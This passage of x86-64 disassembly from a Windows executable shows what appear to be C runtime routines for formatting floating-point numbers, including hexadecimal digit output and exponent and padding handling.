   140007902:	c7 43 0c ff ff ff ff 	movl   $0xffffffff,0xc(%rbx)
   140007909:	e9 c2 fe ff ff       	jmp    0x1400077d0
   14000790e:	66 90                	xchg   %ax,%ax
   140007910:	57                   	push   %rdi
   140007911:	56                   	push   %rsi
   140007912:	53                   	push   %rbx
   140007913:	48 83 ec 20          	sub    $0x20,%rsp
   140007917:	4c 89 ce             	mov    %r9,%rsi
   14000791a:	49 89 d2             	mov    %rdx,%r10
   14000791d:	45 8d 48 ff          	lea    -0x1(%r8),%r9d
   140007921:	41 b8 67 66 66 66    	mov    $0x66666667,%r8d
   140007927:	44 89 c8             	mov    %r9d,%eax
   14000792a:	49 63 d9             	movslq %r9d,%rbx
   14000792d:	41 c1 f9 1f          	sar    $0x1f,%r9d
   140007931:	41 f7 e8             	imul   %r8d
   140007934:	41 89 d0             	mov    %edx,%r8d
   140007937:	41 c1 f8 02          	sar    $0x2,%r8d
   14000793b:	45 29 c8             	sub    %r9d,%r8d
   14000793e:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140007944:	74 23                	je     0x140007969
   140007946:	41 bb 67 66 66 66    	mov    $0x66666667,%r11d
   14000794c:	0f 1f 40 00          	nopl   0x0(%rax)
   140007950:	44 89 c0             	mov    %r8d,%eax
   140007953:	41 c1 f8 1f          	sar    $0x1f,%r8d
   140007957:	41 83 c1 01          	add    $0x1,%r9d
   14000795b:	41 f7 eb             	imul   %r11d
   14000795e:	c1 fa 02             	sar    $0x2,%edx
   140007961:	44 29 c2             	sub    %r8d,%edx
   140007964:	41 89 d0             	mov    %edx,%r8d
   140007967:	75 e7                	jne    0x140007950
   140007969:	8b 46 2c             	mov    0x2c(%rsi),%eax
   14000796c:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000796f:	75 0c                	jne    0x14000797d
   140007971:	c7 46 2c 02 00 00 00 	movl   $0x2,0x2c(%rsi)
   140007978:	b8 02 00 00 00       	mov    $0x2,%eax
   14000797d:	44 8b 46 0c          	mov    0xc(%rsi),%r8d
   140007981:	44 39 c8             	cmp    %r9d,%eax
   140007984:	44 89 cf             	mov    %r9d,%edi
   140007987:	49 89 f1             	mov    %rsi,%r9
   14000798a:	0f 4d f8             	cmovge %eax,%edi
   14000798d:	8d 57 02             	lea    0x2(%rdi),%edx
   140007990:	44 89 c0             	mov    %r8d,%eax
   140007993:	29 d0                	sub    %edx,%eax
   140007995:	41 39 d0             	cmp    %edx,%r8d
   140007998:	ba ff ff ff ff       	mov    $0xffffffff,%edx
   14000799d:	0f 4e c2             	cmovle %edx,%eax
   1400079a0:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1400079a6:	4c 89 d2             	mov    %r10,%rdx
   1400079a9:	89 46 0c             	mov    %eax,0xc(%rsi)
   1400079ac:	e8 7f f6 ff ff       	call   0x140007030
   1400079b1:	8b 4e 08             	mov    0x8(%rsi),%ecx
   1400079b4:	48 89 f2             	mov    %rsi,%rdx
   1400079b7:	8b 46 2c             	mov    0x2c(%rsi),%eax
   1400079ba:	89 46 10             	mov    %eax,0x10(%rsi)
   1400079bd:	89 c8                	mov    %ecx,%eax
   1400079bf:	83 e1 20             	and    $0x20,%ecx
   1400079c2:	0d c0 01 00 00       	or     $0x1c0,%eax
   1400079c7:	83 c9 45             	or     $0x45,%ecx
   1400079ca:	89 46 08             	mov    %eax,0x8(%rsi)
   1400079cd:	e8 ce f1 ff ff       	call   0x140006ba0
   1400079d2:	44 8d 4f 01          	lea    0x1(%rdi),%r9d
   1400079d6:	48 89 f2             	mov    %rsi,%rdx
   1400079d9:	48 89 d9             	mov    %rbx,%rcx
   1400079dc:	44 01 4e 0c          	add    %r9d,0xc(%rsi)
   1400079e0:	48 83 c4 20          	add    $0x20,%rsp
   1400079e4:	5b                   	pop    %rbx
   1400079e5:	5e                   	pop    %rsi
   1400079e6:	5f                   	pop    %rdi
   1400079e7:	e9 24 fc ff ff       	jmp    0x140007610
   1400079ec:	0f 1f 40 00          	nopl   0x0(%rax)
   1400079f0:	56                   	push   %rsi
   1400079f1:	53                   	push   %rbx
   1400079f2:	48 83 ec 58          	sub    $0x58,%rsp
   1400079f6:	44 8b 42 10          	mov    0x10(%rdx),%r8d
   1400079fa:	db 29                	fldt   (%rcx)
   1400079fc:	45 85 c0             	test   %r8d,%r8d
   1400079ff:	48 89 d3             	mov    %rdx,%rbx
   140007a02:	78 5c                	js     0x140007a60
   140007a04:	41 83 c0 01          	add    $0x1,%r8d
   140007a08:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
   140007a0d:	b9 02 00 00 00       	mov    $0x2,%ecx
   140007a12:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140007a17:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140007a1c:	db 7c 24 30          	fstpt  0x30(%rsp)
   140007a20:	4c 8d 4c 24 4c       	lea    0x4c(%rsp),%r9
   140007a25:	e8 36 fa ff ff       	call   0x140007460
   140007a2a:	44 8b 44 24 4c       	mov    0x4c(%rsp),%r8d
   140007a2f:	48 89 c6             	mov    %rax,%rsi
   140007a32:	41 81 f8 00 80 ff ff 	cmp    $0xffff8000,%r8d
   140007a39:	74 35                	je     0x140007a70
   140007a3b:	8b 4c 24 48          	mov    0x48(%rsp),%ecx
   140007a3f:	49 89 d9             	mov    %rbx,%r9
   140007a42:	48 89 c2             	mov    %rax,%rdx
   140007a45:	e8 c6 fe ff ff       	call   0x140007910
   140007a4a:	48 89 f1             	mov    %rsi,%rcx
   140007a4d:	e8 9e 16 00 00       	call   0x1400090f0
   140007a52:	90                   	nop
   140007a53:	48 83 c4 58          	add    $0x58,%rsp
   140007a57:	5b                   	pop    %rbx
   140007a58:	5e                   	pop    %rsi
   140007a59:	c3                   	ret
   140007a5a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140007a60:	c7 42 10 06 00 00 00 	movl   $0x6,0x10(%rdx)
   140007a67:	41 b8 07 00 00 00    	mov    $0x7,%r8d
   140007a6d:	eb 99                	jmp    0x140007a08
   140007a6f:	90                   	nop
   140007a70:	8b 4c 24 48          	mov    0x48(%rsp),%ecx
   140007a74:	49 89 d8             	mov    %rbx,%r8
   140007a77:	48 89 c2             	mov    %rax,%rdx
   140007a7a:	e8 11 f3 ff ff       	call   0x140006d90
   140007a7f:	48 89 f1             	mov    %rsi,%rcx
   140007a82:	e8 69 16 00 00       	call   0x1400090f0
   140007a87:	90                   	nop
   140007a88:	48 83 c4 58          	add    $0x58,%rsp
   140007a8c:	5b                   	pop    %rbx
   140007a8d:	5e                   	pop    %rsi
   140007a8e:	c3                   	ret
   140007a8f:	90                   	nop
   140007a90:	57                   	push   %rdi
   140007a91:	56                   	push   %rsi
   140007a92:	53                   	push   %rbx
   140007a93:	48 83 ec 50          	sub    $0x50,%rsp
   140007a97:	44 8b 42 10          	mov    0x10(%rdx),%r8d
   140007a9b:	db 29                	fldt   (%rcx)
   140007a9d:	45 85 c0             	test   %r8d,%r8d
   140007aa0:	48 89 d3             	mov    %rdx,%rbx
   140007aa3:	0f 88 f9 00 00 00    	js     0x140007ba2
   140007aa9:	0f 84 e1 00 00 00    	je     0x140007b90
   140007aaf:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
   140007ab4:	b9 02 00 00 00       	mov    $0x2,%ecx
   140007ab9:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140007abe:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140007ac3:	db 7c 24 30          	fstpt  0x30(%rsp)
   140007ac7:	4c 8d 4c 24 4c       	lea    0x4c(%rsp),%r9
   140007acc:	e8 8f f9 ff ff       	call   0x140007460
   140007ad1:	8b 74 24 4c          	mov    0x4c(%rsp),%esi
   140007ad5:	48 89 c7             	mov    %rax,%rdi
   140007ad8:	81 fe 00 80 ff ff    	cmp    $0xffff8000,%esi
   140007ade:	0f 84 d0 00 00 00    	je     0x140007bb4
   140007ae4:	8b 43 08             	mov    0x8(%rbx),%eax
   140007ae7:	25 00 08 00 00       	and    $0x800,%eax
   140007aec:	83 fe fd             	cmp    $0xfffffffd,%esi
   140007aef:	7c 5f                	jl     0x140007b50
   140007af1:	8b 53 10             	mov    0x10(%rbx),%edx
   140007af4:	39 d6                	cmp    %edx,%esi
   140007af6:	7f 58                	jg     0x140007b50
   140007af8:	85 c0                	test   %eax,%eax
   140007afa:	0f 84 d4 00 00 00    	je     0x140007bd4
   140007b00:	29 f2                	sub    %esi,%edx
   140007b02:	89 53 10             	mov    %edx,0x10(%rbx)
   140007b05:	8b 4c 24 48          	mov    0x48(%rsp),%ecx
   140007b09:	49 89 d9             	mov    %rbx,%r9
   140007b0c:	41 89 f0             	mov    %esi,%r8d
   140007b0f:	48 89 fa             	mov    %rdi,%rdx
   140007b12:	e8 19 f5 ff ff       	call   0x140007030
   140007b17:	eb 14                	jmp    0x140007b2d
   140007b19:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140007b20:	48 89 da             	mov    %rbx,%rdx
   140007b23:	b9 20 00 00 00       	mov    $0x20,%ecx
   140007b28:	e8 73 f0 ff ff       	call   0x140006ba0
   140007b2d:	8b 43 0c             	mov    0xc(%rbx),%eax
   140007b30:	8d 50 ff             	lea    -0x1(%rax),%edx
   140007b33:	85 c0                	test   %eax,%eax
   140007b35:	89 53 0c             	mov    %edx,0xc(%rbx)
   140007b38:	7f e6                	jg     0x140007b20
   140007b3a:	48 89 f9             	mov    %rdi,%rcx
   140007b3d:	e8 ae 15 00 00       	call   0x1400090f0
   140007b42:	90                   	nop
   140007b43:	48 83 c4 50          	add    $0x50,%rsp
   140007b47:	5b                   	pop    %rbx
   140007b48:	5e                   	pop    %rsi
   140007b49:	5f                   	pop    %rdi
   140007b4a:	c3                   	ret
   140007b4b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007b50:	85 c0                	test   %eax,%eax
   140007b52:	75 31                	jne    0x140007b85
   140007b54:	48 89 f9             	mov    %rdi,%rcx
   140007b57:	e8 94 3f 00 00       	call   0x14000baf0
   140007b5c:	83 e8 01             	sub    $0x1,%eax
   140007b5f:	8b 4c 24 48          	mov    0x48(%rsp),%ecx
   140007b63:	89 43 10             	mov    %eax,0x10(%rbx)
   140007b66:	49 89 d9             	mov    %rbx,%r9
   140007b69:	41 89 f0             	mov    %esi,%r8d
   140007b6c:	48 89 fa             	mov    %rdi,%rdx
   140007b6f:	e8 9c fd ff ff       	call   0x140007910
   140007b74:	48 89 f9             	mov    %rdi,%rcx
   140007b77:	e8 74 15 00 00       	call   0x1400090f0
   140007b7c:	90                   	nop
   140007b7d:	48 83 c4 50          	add    $0x50,%rsp
   140007b81:	5b                   	pop    %rbx
   140007b82:	5e                   	pop    %rsi
   140007b83:	5f                   	pop    %rdi
   140007b84:	c3                   	ret
   140007b85:	8b 43 10             	mov    0x10(%rbx),%eax
   140007b88:	83 e8 01             	sub    $0x1,%eax
   140007b8b:	eb d2                	jmp    0x140007b5f
   140007b8d:	0f 1f 00             	nopl   (%rax)
   140007b90:	c7 42 10 01 00 00 00 	movl   $0x1,0x10(%rdx)
   140007b97:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140007b9d:	e9 0d ff ff ff       	jmp    0x140007aaf
   140007ba2:	c7 42 10 06 00 00 00 	movl   $0x6,0x10(%rdx)
   140007ba9:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   140007baf:	e9 fb fe ff ff       	jmp    0x140007aaf
   140007bb4:	8b 4c 24 48          	mov    0x48(%rsp),%ecx
   140007bb8:	49 89 d8             	mov    %rbx,%r8
   140007bbb:	48 89 c2             	mov    %rax,%rdx
   140007bbe:	e8 cd f1 ff ff       	call   0x140006d90
   140007bc3:	48 89 f9             	mov    %rdi,%rcx
   140007bc6:	e8 25 15 00 00       	call   0x1400090f0
   140007bcb:	90                   	nop
   140007bcc:	48 83 c4 50          	add    $0x50,%rsp
   140007bd0:	5b                   	pop    %rbx
   140007bd1:	5e                   	pop    %rsi
   140007bd2:	5f                   	pop    %rdi
   140007bd3:	c3                   	ret
   140007bd4:	48 89 f9             	mov    %rdi,%rcx
   140007bd7:	e8 14 3f 00 00       	call   0x14000baf0
   140007bdc:	29 f0                	sub    %esi,%eax
   140007bde:	89 43 10             	mov    %eax,0x10(%rbx)
   140007be1:	0f 89 1e ff ff ff    	jns    0x140007b05
   140007be7:	8b 53 0c             	mov    0xc(%rbx),%edx
   140007bea:	85 d2                	test   %edx,%edx
   140007bec:	0f 8e 13 ff ff ff    	jle    0x140007b05
   140007bf2:	01 d0                	add    %edx,%eax
   140007bf4:	89 43 0c             	mov    %eax,0xc(%rbx)
   140007bf7:	e9 09 ff ff ff       	jmp    0x140007b05
   140007bfc:	0f 1f 40 00          	nopl   0x0(%rax)
   140007c00:	41 56                	push   %r14
   140007c02:	41 55                	push   %r13
   140007c04:	41 54                	push   %r12
   140007c06:	55                   	push   %rbp
   140007c07:	57                   	push   %rdi
   140007c08:	56                   	push   %rsi
   140007c09:	53                   	push   %rbx
   140007c0a:	48 83 ec 50          	sub    $0x50,%rsp
   140007c0e:	48 85 c9             	test   %rcx,%rcx
   140007c11:	49 89 c9             	mov    %rcx,%r9
   140007c14:	4c 89 c3             	mov    %r8,%rbx
   140007c17:	0f 95 c1             	setne  %cl
   140007c1a:	66 85 d2             	test   %dx,%dx
   140007c1d:	75 06                	jne    0x140007c25
   140007c1f:	31 ed                	xor    %ebp,%ebp
   140007c21:	84 c9                	test   %cl,%cl
   140007c23:	74 03                	je     0x140007c28
   140007c25:	8d 6a fd             	lea    -0x3(%rdx),%ebp
   140007c28:	8b 43 10             	mov    0x10(%rbx),%eax
   140007c2b:	85 c0                	test   %eax,%eax
   140007c2d:	41 0f 9f c0          	setg   %r8b
   140007c31:	83 f8 0e             	cmp    $0xe,%eax
   140007c34:	0f 87 36 01 00 00    	ja     0x140007d70
   140007c3a:	b9 0e 00 00 00       	mov    $0xe,%ecx
   140007c3f:	ba 04 00 00 00       	mov    $0x4,%edx
   140007c44:	49 d1 e9             	shr    $1,%r9
   140007c47:	29 c1                	sub    %eax,%ecx
   140007c49:	c1 e1 02             	shl    $0x2,%ecx
   140007c4c:	48 d3 e2             	shl    %cl,%rdx
   140007c4f:	49 01 d1             	add    %rdx,%r9
   140007c52:	0f 88 2c 01 00 00    	js     0x140007d84
   140007c58:	b9 0f 00 00 00       	mov    $0xf,%ecx
   140007c5d:	4d 01 c9             	add    %r9,%r9
   140007c60:	29 c1                	sub    %eax,%ecx
   140007c62:	c1 e1 02             	shl    $0x2,%ecx
   140007c65:	49 d3 e9             	shr    %cl,%r9
   140007c68:	4d 85 c9             	test   %r9,%r9
   140007c6b:	0f 85 27 01 00 00    	jne    0x140007d98
   140007c71:	45 84 c0             	test   %r8b,%r8b
   140007c74:	0f 85 1e 01 00 00    	jne    0x140007d98
   140007c7a:	8b 4b 08             	mov    0x8(%rbx),%ecx
   140007c7d:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
   140007c82:	f6 c5 08             	test   $0x8,%ch
   140007c85:	41 89 cd             	mov    %ecx,%r13d
   140007c88:	48 89 f8             	mov    %rdi,%rax
   140007c8b:	74 09                	je     0x140007c96
   140007c8d:	c6 44 24 30 2e       	movb   $0x2e,0x30(%rsp)
   140007c92:	48 8d 47 01          	lea    0x1(%rdi),%rax
   140007c96:	44 8b 5b 0c          	mov    0xc(%rbx),%r11d
   140007c9a:	48 8d 70 01          	lea    0x1(%rax),%rsi
   140007c9e:	c6 00 30             	movb   $0x30,(%rax)
   140007ca1:	41 bc 02 00 00 00    	mov    $0x2,%r12d
   140007ca7:	45 85 db             	test   %r11d,%r11d
   140007caa:	0f 8f 7b 01 00 00    	jg     0x140007e2b
   140007cb0:	41 f6 c5 80          	test   $0x80,%r13b
   140007cb4:	0f 85 46 02 00 00    	jne    0x140007f00
   140007cba:	41 f7 c5 00 01 00 00 	test   $0x100,%r13d
   140007cc1:	0f 85 0a 03 00 00    	jne    0x140007fd1
   140007cc7:	41 83 e5 40          	and    $0x40,%r13d
   140007ccb:	0f 85 3f 03 00 00    	jne    0x140008010
   140007cd1:	48 89 da             	mov    %rbx,%rdx
   140007cd4:	b9 30 00 00 00       	mov    $0x30,%ecx
   140007cd9:	e8 c2 ee ff ff       	call   0x140006ba0
   140007cde:	8b 4b 08             	mov    0x8(%rbx),%ecx
   140007ce1:	48 89 da             	mov    %rbx,%rdx
   140007ce4:	83 e1 20             	and    $0x20,%ecx
   140007ce7:	83 c9 58             	or     $0x58,%ecx
   140007cea:	e8 b1 ee ff ff       	call   0x140006ba0
   140007cef:	8b 43 0c             	mov    0xc(%rbx),%eax
   140007cf2:	85 c0                	test   %eax,%eax
   140007cf4:	7e 26                	jle    0x140007d1c
   140007cf6:	f6 43 09 02          	testb  $0x2,0x9(%rbx)
   140007cfa:	74 20                	je     0x140007d1c
   140007cfc:	83 e8 01             	sub    $0x1,%eax
   140007cff:	89 43 0c             	mov    %eax,0xc(%rbx)
   140007d02:	48 89 da             	mov    %rbx,%rdx
   140007d05:	b9 30 00 00 00       	mov    $0x30,%ecx
   140007d0a:	e8 91 ee ff ff       	call   0x140006ba0
   140007d0f:	8b 43 0c             	mov    0xc(%rbx),%eax
   140007d12:	8d 50 ff             	lea    -0x1(%rax),%edx
   140007d15:	85 c0                	test   %eax,%eax
   140007d17:	89 53 0c             	mov    %edx,0xc(%rbx)
   140007d1a:	7f e6                	jg     0x140007d02
   140007d1c:	4c 8d 6c 24 2e       	lea    0x2e(%rsp),%r13
   140007d21:	48 39 fe             	cmp    %rdi,%rsi
   140007d24:	77 25                	ja     0x140007d4b
   140007d26:	e9 33 02 00 00       	jmp    0x140007f5e
   140007d2b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007d30:	0f b7 43 20          	movzwl 0x20(%rbx),%eax
   140007d34:	66 85 c0             	test   %ax,%ax
   140007d37:	66 89 44 24 2e       	mov    %ax,0x2e(%rsp)
   140007d3c:	0f 85 6e 02 00 00    	jne    0x140007fb0
   140007d42:	48 39 fe             	cmp    %rdi,%rsi
   140007d45:	0f 84 13 02 00 00    	je     0x140007f5e
   140007d4b:	48 83 ee 01          	sub    $0x1,%rsi
   140007d4f:	0f be 0e             	movsbl (%rsi),%ecx
   140007d52:	83 f9 2e             	cmp    $0x2e,%ecx
   140007d55:	0f 84 48 02 00 00    	je     0x140007fa3
   140007d5b:	83 f9 2c             	cmp    $0x2c,%ecx
   140007d5e:	74 d0                	je     0x140007d30
   140007d60:	48 89 da             	mov    %rbx,%rdx
   140007d63:	e8 38 ee ff ff       	call   0x140006ba0
   140007d68:	eb d8                	jmp    0x140007d42
   140007d6a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140007d70:	84 c9                	test   %cl,%cl
   140007d72:	75 09                	jne    0x140007d7d
   140007d74:	45 84 c0             	test   %r8b,%r8b
   140007d77:	0f 84 fd fe ff ff    	je     0x140007c7a
   140007d7d:	b8 10 00 00 00       	mov    $0x10,%eax
   140007d82:	eb 17                	jmp    0x140007d9b
   140007d84:	b9 0f 00 00 00       	mov    $0xf,%ecx
   140007d89:	49 c1 e9 03          	shr    $0x3,%r9
   140007d8d:	83 c5 04             	add    $0x4,%ebp
   140007d90:	29 c1                	sub    %eax,%ecx
   140007d92:	c1 e1 02             	shl    $0x2,%ecx
   140007d95:	49 d3 e9             	shr    %cl,%r9
   140007d98:	83 c0 01             	add    $0x1,%eax
   140007d9b:	8b 4b 08             	mov    0x8(%rbx),%ecx
   140007d9e:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
   140007da3:	48 89 fe             	mov    %rdi,%rsi
   140007da6:	41 89 ca             	mov    %ecx,%r10d
   140007da9:	41 89 cb             	mov    %ecx,%r11d
   140007dac:	41 83 e2 20          	and    $0x20,%r10d
   140007db0:	41 81 e3 00 08 00 00 	and    $0x800,%r11d
   140007db7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140007dbe:	00 00 
   140007dc0:	45 89 c8             	mov    %r9d,%r8d
   140007dc3:	41 83 e0 0f          	and    $0xf,%r8d
   140007dc7:	83 f8 01             	cmp    $0x1,%eax
   140007dca:	0f 84 60 01 00 00    	je     0x140007f30
   140007dd0:	8b 53 10             	mov    0x10(%rbx),%edx
   140007dd3:	85 d2                	test   %edx,%edx
   140007dd5:	7e 06                	jle    0x140007ddd
   140007dd7:	83 ea 01             	sub    $0x1,%edx
   140007dda:	89 53 10             	mov    %edx,0x10(%rbx)
   140007ddd:	45 85 c0             	test   %r8d,%r8d
   140007de0:	0f 85 2c 01 00 00    	jne    0x140007f12
   140007de6:	31 d2                	xor    %edx,%edx
   140007de8:	48 39 fe             	cmp    %rdi,%rsi
   140007deb:	77 09                	ja     0x140007df6
   140007ded:	8b 53 10             	mov    0x10(%rbx),%edx
   140007df0:	85 d2                	test   %edx,%edx
   140007df2:	78 0f                	js     0x140007e03
   140007df4:	31 d2                	xor    %edx,%edx
   140007df6:	83 c2 30             	add    $0x30,%edx
   140007df9:	49 89 f0             	mov    %rsi,%r8
   140007dfc:	48 83 c6 01          	add    $0x1,%rsi
   140007e00:	41 88 10             	mov    %dl,(%r8)
   140007e03:	49 c1 e9 04          	shr    $0x4,%r9
   140007e07:	83 e8 01             	sub    $0x1,%eax
   140007e0a:	75 b4                	jne    0x140007dc0
   140007e0c:	48 39 fe             	cmp    %rdi,%rsi
   140007e0f:	41 89 cd             	mov    %ecx,%r13d
   140007e12:	0f 84 d8 01 00 00    	je     0x140007ff0
   140007e18:	44 8b 5b 0c          	mov    0xc(%rbx),%r11d
   140007e1c:	41 bc 02 00 00 00    	mov    $0x2,%r12d
   140007e22:	45 85 db             	test   %r11d,%r11d
   140007e25:	0f 8e 85 fe ff ff    	jle    0x140007cb0
   140007e2b:	8b 53 10             	mov    0x10(%rbx),%edx
   140007e2e:	48 89 f0             	mov    %rsi,%rax
   140007e31:	44 0f bf cd          	movswl %bp,%r9d
   140007e35:	48 29 f8             	sub    %rdi,%rax
   140007e38:	44 8d 04 02          	lea    (%rdx,%rax,1),%r8d
   140007e3c:	85 d2                	test   %edx,%edx
   140007e3e:	41 0f 4f c0          	cmovg  %r8d,%eax
   140007e42:	31 d2                	xor    %edx,%edx
   140007e44:	f7 c1 c0 01 00 00    	test   $0x1c0,%ecx
   140007e4a:	0f 95 c2             	setne  %dl
   140007e4d:	41 b8 67 66 66 66    	mov    $0x66666667,%r8d
   140007e53:	44 8d 54 10 05       	lea    0x5(%rax,%rdx,1),%r10d
   140007e58:	44 89 c8             	mov    %r9d,%eax
   140007e5b:	41 c1 f9 1f          	sar    $0x1f,%r9d
   140007e5f:	41 f7 e8             	imul   %r8d
   140007e62:	41 89 d0             	mov    %edx,%r8d
   140007e65:	41 c1 f8 02          	sar    $0x2,%r8d
   140007e69:	45 29 c8             	sub    %r9d,%r8d
   140007e6c:	45 89 d1             	mov    %r10d,%r9d
   140007e6f:	74 33                	je     0x140007ea4
   140007e71:	41 be 67 66 66 66    	mov    $0x66666667,%r14d
   140007e77:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140007e7e:	00 00 
   140007e80:	44 89 c0             	mov    %r8d,%eax
   140007e83:	41 83 c1 01          	add    $0x1,%r9d
   140007e87:	41 c1 f8 1f          	sar    $0x1f,%r8d
   140007e8b:	41 f7 ee             	imul   %r14d
   140007e8e:	45 8d 61 02          	lea    0x2(%r9),%r12d
   140007e92:	45 29 d4             	sub    %r10d,%r12d
   140007e95:	c1 fa 02             	sar    $0x2,%edx
   140007e98:	44 29 c2             	sub    %r8d,%edx
   140007e9b:	41 89 d0             	mov    %edx,%r8d
   140007e9e:	75 e0                	jne    0x140007e80
   140007ea0:	45 0f bf e4          	movswl %r12w,%r12d
   140007ea4:	45 39 cb             	cmp    %r9d,%r11d
   140007ea7:	0f 8e 18 01 00 00    	jle    0x140007fc5
   140007ead:	45 29 cb             	sub    %r9d,%r11d
   140007eb0:	80 e5 06             	and    $0x6,%ch
   140007eb3:	0f 85 2a 01 00 00    	jne    0x140007fe3
   140007eb9:	41 8d 43 ff          	lea    -0x1(%r11),%eax
   140007ebd:	45 85 db             	test   %r11d,%r11d
   140007ec0:	89 43 0c             	mov    %eax,0xc(%rbx)
   140007ec3:	0f 8e e7 fd ff ff    	jle    0x140007cb0
   140007ec9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140007ed0:	48 89 da             	mov    %rbx,%rdx
   140007ed3:	b9 20 00 00 00       	mov    $0x20,%ecx
   140007ed8:	e8 c3 ec ff ff       	call   0x140006ba0
   140007edd:	8b 43 0c             	mov    0xc(%rbx),%eax
   140007ee0:	8d 50 ff             	lea    -0x1(%rax),%edx
   140007ee3:	85 c0                	test   %eax,%eax
   140007ee5:	89 53 0c             	mov    %edx,0xc(%rbx)
   140007ee8:	7f e6                	jg     0x140007ed0
   140007eea:	44 8b 6b 08          	mov    0x8(%rbx),%r13d
   140007eee:	41 f6 c5 80          	test   $0x80,%r13b
   140007ef2:	0f 84 c2 fd ff ff    	je     0x140007cba
   140007ef8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140007eff:	00 
   140007f00:	48 89 da             	mov    %rbx,%rdx
   140007f03:	b9 2d 00 00 00       	mov    $0x2d,%ecx
   140007f08:	e8 93 ec ff ff       	call   0x140006ba0
   140007f0d:	e9 bf fd ff ff       	jmp    0x140007cd1
   140007f12:	41 83 f8 09          	cmp    $0x9,%r8d
   140007f16:	44 89 c2             	mov    %r8d,%edx
   140007f19:	0f 86 d7 fe ff ff    	jbe    0x140007df6
   140007f1f:	41 8d 50 37          	lea    0x37(%r8),%edx
   140007f23:	49 89 f0             	mov    %rsi,%r8
   140007f26:	44 09 d2             	or     %r10d,%edx
   140007f29:	e9 ce fe ff ff       	jmp    0x140007dfc
   140007f2e:	66 90                	xchg   %ax,%ax
   140007f30:	48 39 fe             	cmp    %rdi,%rsi
   140007f33:	77 10                	ja     0x140007f45
   140007f35:	45 85 db             	test   %r11d,%r11d
   140007f38:	75 0b                	jne    0x140007f45
   140007f3a:	8b 53 10             	mov    0x10(%rbx),%edx
   140007f3d:	85 d2                	test   %edx,%edx
   140007f3f:	0f 8e dd 00 00 00    	jle    0x140008022
   140007f45:	c6 06 2e             	movb   $0x2e,(%rsi)
   140007f48:	48 83 c6 01          	add    $0x1,%rsi
   140007f4c:	e9 8c fe ff ff       	jmp    0x140007ddd
   140007f51:	48 89 da             	mov    %rbx,%rdx
   140007f54:	b9 30 00 00 00       	mov    $0x30,%ecx
   140007f59:	e8 42 ec ff ff       	call   0x140006ba0
   140007f5e:	8b 43 10             	mov    0x10(%rbx),%eax
   140007f61:	8d 50 ff             	lea    -0x1(%rax),%edx
   140007f64:	85 c0                	test   %eax,%eax
   140007f66:	89 53 10             	mov    %edx,0x10(%rbx)
   140007f69:	7f e6                	jg     0x140007f51
   140007f6b:	8b 4b 08             	mov    0x8(%rbx),%ecx
   140007f6e:	48 89 da             	mov    %rbx,%rdx
   140007f71:	83 e1 20             	and    $0x20,%ecx
   140007f74:	83 c9 50             	or     $0x50,%ecx
   140007f77:	e8 24 ec ff ff       	call   0x140006ba0
   140007f7c:	48 0f bf cd          	movswq %bp,%rcx
   140007f80:	48 89 da             	mov    %rbx,%rdx
   140007f83:	44 01 63 0c          	add    %r12d,0xc(%rbx)
   140007f87:	81 4b 08 c0 01 00 00 	orl    $0x1c0,0x8(%rbx)
   140007f8e:	e8 7d f6 ff ff       	call   0x140007610
   140007f93:	90                   	nop
   140007f94:	48 83 c4 50          	add    $0x50,%rsp
   140007f98:	5b                   	pop    %rbx
   140007f99:	5e                   	pop    %rsi
   140007f9a:	5f                   	pop    %rdi
   140007f9b:	5d                   	pop    %rbp
   140007f9c:	41 5c                	pop    %r12
   140007f9e:	41 5d                	pop    %r13
   140007fa0:	41 5e                	pop    %r14
   140007fa2:	c3                   	ret
   140007fa3:	48 89 d9             	mov    %rbx,%rcx
   140007fa6:	e8 85 ee ff ff       	call   0x140006e30
   140007fab:	e9 92 fd ff ff       	jmp    0x140007d42
   140007fb0:	49 89 d8             	mov    %rbx,%r8
   140007fb3:	ba 01 00 00 00       	mov    $0x1,%edx
   140007fb8:	4c 89 e9             	mov    %r13,%rcx
   140007fbb:	e8 f0 ee ff ff       	call   0x140006eb0
   140007fc0:	e9 7d fd ff ff       	jmp    0x140007d42
   140007fc5:	c7 43 0c ff ff ff ff 	movl   $0xffffffff,0xc(%rbx)
   140007fcc:	e9 df fc ff ff       	jmp    0x140007cb0
   140007fd1:	48 89 da             	mov    %rbx,%rdx
   140007fd4:	b9 2b 00 00 00       	mov    $0x2b,%ecx
   140007fd9:	e8 c2 eb ff ff       	call   0x140006ba0
   140007fde:	e9 ee fc ff ff       	jmp    0x140007cd1
   140007fe3:	44 89 5b 0c          	mov    %r11d,0xc(%rbx)
   140007fe7:	e9 c4 fc ff ff       	jmp    0x140007cb0
   140007fec:	0f 1f 40 00          	nopl   0x0(%rax)
   140007ff0:	8b 43 10             	mov    0x10(%rbx),%eax
   140007ff3:	85 c0                	test   %eax,%eax
   140007ff5:	0f 8e 87 fc ff ff    	jle    0x140007c82
   140007ffb:	c6 44 24 30 2e       	movb   $0x2e,0x30(%rsp)
   140008000:	48 8d 47 01          	lea    0x1(%rdi),%rax
   140008004:	e9 8d fc ff ff       	jmp    0x140007c96
   140008009:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140008010:	48 89 da             	mov    %rbx,%rdx
   140008013:	b9 20 00 00 00       	mov    $0x20,%ecx
   140008018:	e8 83 eb ff ff       	call   0x140006ba0
